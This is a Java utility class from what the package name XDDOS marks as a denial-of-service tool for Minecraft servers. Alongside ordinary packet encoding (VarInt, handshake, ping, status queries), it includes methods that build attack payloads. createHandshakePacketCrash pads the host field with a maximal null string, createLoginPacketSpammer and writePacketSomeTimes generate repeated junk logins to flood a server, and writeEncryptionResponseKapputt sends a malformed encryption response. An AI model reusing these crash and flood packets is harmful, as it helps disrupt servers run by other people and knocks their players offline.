package XD.XDDOS.utils.packet;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

import XD.XDDOS.utils.helper.RandomUtils;

public class PacketUtils {
    public static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte(value & 0x7F | 0x80);
            value >>>= 7;
        }
        out.writeByte(value);
    }

    public static void writeString(DataOutputStream out, String value) throws IOException {
        byte[] data = value.getBytes(StandardCharsets.UTF_8);
        writeVarInt(out, data.length);
        out.write(data, 0, data.length);
    }

    public static int readVarInt(DataInputStream in) throws IOException {
        int i = 0;
        int j = 0;
        while (true) {
            byte k = in.readByte();
            i |= (k & Byte.MAX_VALUE) << j++ * 7;
            if (j <= 5) {
                if ((k & 0x80) != 128)
                    return i;
                continue;
            }
            throw new RuntimeException("VarInt too big");
        }
    }

    public static byte[] createHandshakePacketCrash(String ip, int port, int protocol) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, new String(new byte[32767]), port, protocol, 2);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static String readString(DataInputStream in) throws IOException {
        int len = readVarInt(in);
        byte[] data = new byte[len];
        in.readFully(data);
        return new String(data, 0, len, StandardCharsets.UTF_8);
    }

    public static void writeHandshakePacket(DataOutputStream out, String ip, int port, int protocol, int state) throws IOException {
        writeVarInt(out, 0);
        writeVarInt(out, protocol);
        writeString(out, ip);
        out.writeShort(port);
        writeVarInt(out, state);
    }

    public static void writeQueryRequestPacket(DataOutputStream out) throws IOException {
        writeVarInt(out, 0);
    }

    public static void writePingPacket(DataOutputStream out, long clientTime) throws IOException {
        writeVarInt(out, 1);
        out.writeLong(clientTime);
    }

    public static void writePacket(byte[] packetData, DataOutputStream out) throws IOException {
        writeVarInt(out, packetData.length);
        out.write(packetData);
    }

    public static String readServerDataPacket(DataInputStream in) throws IOException {
        byte id = in.readByte();
        if (id != 0)
            return null;
        return readString(in);
    }

    public static void writePacketSomeTimes(byte[] packetData, DataOutputStream out, int times) throws IOException {
        ByteArrayOutputStream LoginOutPutStream = null;
        LoginOutPutStream = new ByteArrayOutputStream();
        DataOutputStream login = new DataOutputStream(LoginOutPutStream);
        writeVarInt(login, packetData.length);
        login.write(packetData);
        byte[] bytes = LoginOutPutStream.toByteArray();
        int i = 0;
        while (i < times) {
            out.write(bytes);
            i++;
        }
    }

    public static long readPongPacket(DataInputStream in) throws IOException {
        byte id = in.readByte();
        if (id != 1)
            return -1L;
        return in.readLong();
    }

    public static byte[] createHandshakePacket(String ip, int port, int protocol) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocol, 2);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createPingPacket() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writePingPacket(out, System.currentTimeMillis());
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createHandshakePacketBroke(String ip, int port, int protocol) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocol, 2);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createLoginPacket() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, RandomUtils.randomString(16));
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createChatPacket(String text) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 1);
        writeString(out, text);
        out.close();
        return bytes.toByteArray();
    }

    public static byte[] createLoginPacketSpammer() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, "♦♦♦♦♦♦");
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static void writeEncryptionResponseKapputt(DataOutputStream lol) throws IOException {
        ByteArrayOutputStream stream = null;
        stream = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(stream);
        writeVarInt(out, 1);
        byte[] byArray = new byte[15];
        byArray[0] = 9;
        byArray[1] = -23;
        byArray[2] = 21;
        byArray[3] = 3;
        byArray[4] = 123;
        byArray[5] = 32;
        byArray[6] = 34;
        byArray[8] = 45;
        byArray[9] = -34;
        byArray[10] = 4;
        byArray[11] = 34;
        byArray[12] = 4;
        byArray[13] = 56;
        byArray[14] = 34;
        byte[] enc = byArray;
        writeVarInt(out, enc.length);
        out.write(enc);
        writeVarInt(out, enc.length);
        out.write(enc);
        byte[] r = stream.toByteArray();
        writeVarInt(lol, r.length);
        lol.write(r, 0, r.length);
    }

    public static byte[] createEncryptionResponsePacket(byte[] encryptedKey, byte[] encryptedVerifyToken) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 1);
        writeByteArray(out, encryptedKey);
        writeByteArray(out, encryptedVerifyToken);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createLoginPacketBroke() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, RandomUtils.randomString(16));
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createHandshakeMOTDPacket(String ip, int port, int protocol) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocol, 1);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] createLegacyMOTDPacket(String ip, int port) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        out.write(254);
        out.write(1);
        out.write(250);
        char[] achar = "MC|BEdit".toCharArray();
        out.writeShort(achar.length);
        char[] cArray = achar;
        int n = achar.length;
        int n2 = 0;
        while (n2 < n) {
            char c = cArray[n2];
            out.writeChar(c);
            n2++;
        }
        out.writeShort(7 + 2 * ip.length());
        out.write(127);
        char[] ipdata = ip.toCharArray();
        out.writeShort(ip.length());
        char[] cArray2 = ipdata;
        int n3 = ipdata.length;
        n = 0;
        while (n < n3) {
            char c = cArray2[n];
            out.writeChar(c);
            n++;
        }
        out.writeInt(port);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static byte[] readByteArray(DataInputStream in) throws IOException {
        int len = readVarInt(in);
        byte[] data = new byte[len];
        in.readFully(data);
        return data;
    }

    public static void writeByteArray(DataOutputStream out, byte[] data) throws IOException {
        writeVarInt(out, data.length);
        out.write(data, 0, data.length);
    }
}
